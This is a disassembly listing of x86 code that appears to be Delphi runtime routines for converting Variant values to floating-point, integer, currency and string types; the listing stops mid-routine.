lea eax [ ebp - 0x18 ]
call sub_40f824
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411bf8
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411ba4
lea eax [ ebp - 0x18 ]
call sub_40f4fc
retn
sub_411bac
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414a10
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411bf8
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411c14 ]
mov eax ebx
call sub_4119b0
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411afc
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_4119b0
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411a9c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411bf8
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411afc
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411b48
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40ecc4
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411bac
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411afc
fstp [ esp ]
fwait
mov eax ebx
call sub_411afc
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411ddf ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411afc
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_4119b0
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411a9c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411bf8
fstp [ esp ]
fwait
jmp r-xdata
sub_411f48
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411ff4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412f3c
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4043a0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_409a80
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411ffb
lea eax [ ebp - 0x10 ]
call sub_404118
lea eax [ ebp - 0xc ]
call sub_4047f8
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_40f158
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40f158
jmp r-xdata
sub_412004
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40f158
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_412064
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40f158
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_4120b0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412105
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f824
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_412160
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41210c
lea eax [ ebp - 0x18 ]
call sub_40f4fc
retn
sub_412114
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414a10
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_412160
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41217c ]
mov eax ebx
call sub_411f48
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_412064
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_412064
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411f48
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_412004
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_412160
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_412064
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_4120b0
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40ecc4
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_412114
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_412064
fistp [ esp ]
fwait
mov eax ebx
call sub_412064
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_412381 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_412064
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_412064
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411f48
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_412004
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_412160
fistp [ esp ]
fwait
jmp r-xdata
sub_41252c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4047f8
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40f158
pop ebx
pop ebp
retn 0x8
sub_412564
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4047f8
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40f158
pop ebx
pop ebp
retn 0x8
sub_41259c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412652
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4047f8
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40f158
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412659
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40413c
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4043a0
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_4080a0
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404944
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_4043a0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_408064
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_404944
jmp r-xdata
jmp r-xdata
call sub_40ed60
sub_412660
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41271f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4126fd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40f158
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404908
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4049f4
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4043a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412704
lea eax [ ebp - 0x10 ]
call sub_40f4fc
retn
sub_41272c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412782
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f824
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412814
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412789
lea eax [ ebp - 0x10 ]
call sub_40f4fc
retn
sub_412790
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_414a10
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412805
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_40416c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f4fc
retn
sub_412814
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412d4b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41284d ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40416c
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404118
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_40850c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_40416c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_40850c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40416c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4099ac
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40416c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4099ac
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_40416c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_41252c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4043a0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_412564
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4043a0
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_404908
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4049f4
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4043a0
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_41259c
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4043a0
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_40850c
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_40416c
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_40850c
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_40416c
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_40850c
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_40416c
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_4085f8
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_40416c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_4085f8
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_40416c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412814
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_412660
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_40416c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412d52
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_40413c
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_404810
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_40413c
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_404810
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40413c
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_41272c
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_40416c
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40416c
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40ecc4
test ah 0x40
je r-xdata
mov eax esi
call sub_404118
mov edx eax
mov eax ebx
call sub_412790
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_412660
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_40416c
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_412660
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_40416c
jmp r-xdata
jmp [ eax * 4 + jump_table_412ae1 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_40850c
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_40416c
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_40850c
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_40416c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4099ac
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_40416c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_4099ac
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_40416c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_41252c
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4043a0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_412564
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4043a0
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404340
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_41259c
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4043a0
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_40850c
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_40416c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_40850c
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_40416c
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_40850c
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_40416c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_4085f8
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_40416c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_4085f8
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_40416c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412814
jmp r-xdata
sub_412d58
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412e02
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412de5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40f158
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_404908
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4049f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412dec
lea eax [ ebp - 0x10 ]
call sub_40f4fc
retn
sub_412e10
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412e66
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f824
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412f3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412e6d
lea eax [ ebp - 0x10 ]
call sub_40f4fc
retn
sub_412e74
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_412f2c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_414a10
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412f33
lea eax [ ebp - 0x20 ]
call sub_4047f8
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412f0f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_404908
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4049f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f4fc
retn
sub_412f3c
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41348e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412f76 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404944
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_4047f8
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_40850c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404944
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_40850c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404944
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
